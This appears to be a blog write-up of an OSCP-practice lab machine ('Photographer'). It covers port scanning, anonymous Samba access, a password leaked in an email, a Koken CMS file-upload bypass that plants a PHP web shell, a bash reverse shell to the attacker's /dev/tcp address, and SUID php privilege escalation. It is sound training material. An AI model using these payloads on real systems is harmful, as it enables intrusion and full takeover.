@@ -1,0 +1,261 @@
+I"#L<p>This machine was created by <strong>v1n1v131r4</strong>, and was developed to prepare for OSCP, this has two flags: user.txt and proof.txt.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>An ICMP request detected the target machine on the local network, the script that I developed you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>python3 hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.164 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scan was performed to the target machine with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">--open</span> <span class="nt">-T5</span> 192.168.179.164 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT     STATE SERVICE
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8000/tcp open  http-alt
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>On open ports service detection and script scanning was done with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,139,445,8000 192.168.179.164 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Photographer by v1n1v131r4
+139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+8000/tcp open  ssl/http-alt Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: Koken 0.22.24
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: daisa ahomi
+MAC Address: 00:0C:29:8C:2B:76 <span class="o">(</span>VMware<span class="o">)</span>
+Service Info: Host: PHOTOGRAPHER
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-3h19m59s</span>, deviation: 2h53m12s, median: <span class="nt">-5h00m00s</span>
+| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   PHOTOGRAPHER&lt;00&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   PHOTOGRAPHER&lt;03&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   PHOTOGRAPHER&lt;20&gt;     Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery:
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
+|   Computer name: photographer
+|   NetBIOS computer name: PHOTOGRAPHER<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: photographer
+|_  System <span class="nb">time</span>: 2021-11-12T08:30:16-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2021-11-12T13:30:16
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+
+<p>Enumerating the shared folders I found the resource sambashare.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>smbclient <span class="nt">-L</span> 192.168.179.164 <span class="nt">-N</span>       
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        sambashare      Disk      Samba on Ubuntu
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>photographer server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</code></pre></div></div>
+
+<p>With a null session it was possible to access the resource sambashere, there are two files inside this directory, and I downloaded them to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>smbclient //192.168.179.164/sambashare <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Mon Jul 20 20:30:07 2020
+  ..                                  D        0  Tue Jul 21 04:44:25 2020
+  mailsent.txt                        N      503  Mon Jul 20 20:29:40 2020
+  wordpress.bkp.zip                   N 13930308  Mon Jul 20 20:22:23 2020
+
+                278627392 blocks of size 1024. 264268400 blocks available
+smb: <span class="se">\&gt;</span> get mailsent.txt
+getting file <span class="se">\m</span>ailsent.txt of size 503 as mailsent.txt <span class="o">(</span>7.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 7.2 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> get wordpress.bkp.zip
+getting file <span class="se">\w</span>ordpress.bkp.zip of size 13930308 as wordpress.bkp.zip <span class="o">(</span>3206.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3156.5 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In the mailsent.txt file, there is a email for Daisa reminding her that not to forget the secret, that appears to be babygirl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span><span class="nb">cat </span>mailsent.txt 
+Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
+Date: Mon, 20 Jul 2020 11:40:36 <span class="nt">-0400</span>
+From: Agi Clarence &lt;agi@photographer.com&gt;
+User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> U<span class="p">;</span> Windows NT 5.1<span class="p">;</span> en-US<span class="p">;</span> rv:1.0.1<span class="o">)</span> Gecko/20020823 Netscape/7.0
+X-Accept-Language: en-us, en
+MIME-Version: 1.0
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;
+Subject: To Do - Daisa Website<span class="s1">'s
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+
+Hi Daisa!
+Your site is ready now.
+Don'</span>t forget your secret, my babygirl <span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-port-8000">Web Enumeration on port 8000</h3>
+
+<p>The web service on port 8000 is Koken 0.22.24 as we can see in the nmap output, this contains a File Upload Authenticated vulnerability, to exploit this issue we need to log in first, googling I found the path of the login form, /admin.</p>
+
+<p><img src="/assets/images/photographer/screenshot-1.png" alt="" /></p>
+
+<p>Daisa’s email and password can be found in the mailsent.txt file, so logged in with those credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daisa@photographer.com:babygirl
+</code></pre></div></div>
+
+<p><img src="/assets/images/photographer/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/photographer/screenshot-3.png" alt="" /></p>
+
+<p>As we can see, it contains a text file with the instructions on how to exploit the vulnerability.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>searchsploit Koken
+<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+ Exploit Title                                                            |  Path
+<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+Koken CMS 0.22.24 - Arbitrary File Upload <span class="o">(</span>Authenticated<span class="o">)</span>                 | php/webapps/48706.txt
+<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="arbitrary-file-upload">Arbitrary File Upload</h3>
+
+<p>The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.</p>
+
+<p>We need to create a malicious PHP file as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'&lt;?php system($_GET["cmd"]);?&gt;'</span> <span class="o">&gt;</span> image.php.jpg
+</code></pre></div></div>
+
+<p>Then, go to Koken CMS Dashboard, upload your file on “Import Content” button (Library panel) and send the HTTP request to Burp.</p>
+
+<p><img src="/assets/images/photographer/screenshot-4.png" alt="" /></p>
+
+<p>On Burp, rename your file to “image.php”.</p>
+
+<p><img src="/assets/images/photographer/screenshot-5.png" alt="" /></p>
+
+<p>On Koken site click on “Timeline” and click on “Download File” to see where your file is hosted on server.</p>
+
+<p><img src="/assets/images/photographer/screenshot-6.png" alt="" /></p>
+
+<p>As we can see our malicious PHP code was uploaded and we can execute system commands.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd<span class="o">=</span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We set up a netcat listener and run the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.164:8000/storage/originals/bc/b3/image.php?cmd<span class="o">=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>We have a shell with www-data privileges, and upgraded it to a full tty shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script <span class="nt">-qc</span> /bin/bash /dev/null
+Ctrl + z
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg
+export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/photographer<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.164] 46838
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1192<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
+&lt;www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
+www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-vlnp</span> 443
+root@kali:~/photographer<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
+columns 164otographer:/var/www/html/koken/storage/originals/bc/b3<span class="nv">$ </span><span class="nb">stty </span>rows 39  
+www-data@photographer:/var/www/html/koken/storage/originals/bc/b3<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Listing the SUID binaries, an uncommon PHP executable has those permissions, so we can abuse it to escalate privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/home/agi/share<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+...
+/usr/bin/php7.2
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary">SUID Binary</h3>
+
+<p>To get root I used the PHP function <strong>pcntl_exec</strong> that executes specified program in current process space maintaining the permissions of the binary, this was extracted from the <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBINS</a> guide.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/home/agi/share<span class="nv">$ </span>/usr/bin/php7.2 <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="c"># python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'</span>
+root@photographer:/home/agi/share# <span class="nb">cd</span> /root/
+root@photographer:/root# <span class="nb">ls
+</span>proof.txt
+root@photographer:/root# <span class="nb">cat </span>proof.txt 
+                                                                   
+                                .:/://::::///:-<span class="sb">`</span>                                
+                            -/++:+<span class="sb">`</span>:--:o:  oo.-/+/:<span class="sb">`</span>                            
+                         -++-.<span class="sb">`</span>o++s-y:/s: <span class="sb">`</span>sh:hy<span class="sb">`</span>:-/+:<span class="sb">`</span>                         
+                       :o:<span class="sb">``</span>oyo/o<span class="sb">`</span><span class="nb">.</span> <span class="sb">`</span>      <span class="sb">```</span>/-so:+--+/<span class="sb">`</span>                       
+                     <span class="nt">-o</span>:-<span class="sb">`</span>yh//.                 <span class="sb">`</span>./ys/-.o/                      
+                    ++.-ys/:/y-                  /s-:/+/:/o<span class="sb">`</span>                    
+                   o/ :yo-:hNN                   .MNs./+o--s<span class="sb">`</span>                   
+                  ++ soh-/mMMN--.<span class="sb">`</span>            <span class="sb">`</span>.-/MMMd-o:+ <span class="nt">-s</span>                   
+                 .y  /++:NMMMy-.<span class="sb">``</span>            <span class="sb">``</span>-:hMMMmoss: +/                  
+                 s-     hMMMN<span class="sb">`</span> shyo+:.    -/+syd+ :MMMMo     h                  
+                 h     <span class="sb">`</span>MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
+                 y     <span class="sb">`</span>MMMMMMd<span class="sb">`</span>/hdh+..+/.-ohdy--mMMMMMm     +-                 
+                 h      dMMMMd:<span class="sb">````</span>  <span class="sb">`</span>mmNh   <span class="sb">```</span>./NMMMMs     o.                 
+                 y.     /MMMMNmmmmd/ <span class="sb">`</span>s-:o  sdmmmmMMMMN.     h<span class="sb">`</span>                 
+                 :o      sMMMMMMMMs.        <span class="nt">-hMMMMMMMM</span>/     :o                  
+                  s:     <span class="sb">`</span>sMMMMMMMo - <span class="nb">.</span> <span class="sb">`</span><span class="nb">.</span> <span class="nb">.</span> hMMMMMMN+     <span class="sb">`</span>y<span class="sb">`</span>                  
+                  <span class="sb">`</span>s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     <span class="sb">`</span>s-                   
+                   <span class="sb">`</span>s:    <span class="nt">--</span>.sNMMMMMMMMMMMMMMMMMMmo/.    <span class="nt">-s</span><span class="nb">.</span>                    
+                     /o.<span class="sb">`</span>ohd:<span class="sb">`</span>.odNMMMMMMMMMMMMNh+.:os/ <span class="sb">`</span>/o<span class="sb">`</span>                     
+                      .++-<span class="sb">`</span>+y+/:<span class="sb">`</span>/ssdmmNNmNds+-/o-hh:-/o-                       
+                        ./+:<span class="sb">`</span>:yh:dso/.+-++++ss+h++.:++-                         
+                           -/+/-:-/y+/d:yh-o:+--/+/:<span class="sb">`</span>                           
+                              <span class="sb">`</span>-///////////////:<span class="sb">`</span>                               
+                                                                                
+
+Follow me at: http://v1n1v131r4.com
+
+
+d41d8cd98f00b204e9800998ecf8427e
+</code></pre></div></div>
+:ET
